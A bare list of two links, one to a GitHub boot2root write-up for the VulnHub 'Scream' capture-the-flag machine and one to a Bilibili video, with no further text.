https://github.com/Jean-Francois-C/Boot2root-CTFs-Writeups/blob/master/VulnHub%20Scream%20(Beginner-Medium)

https://www.bilibili.com/video/BV1xh411c7Nv/?spm_id_from=333.788&vd_source=8981ead94b755f367ac539f6ccd37f77





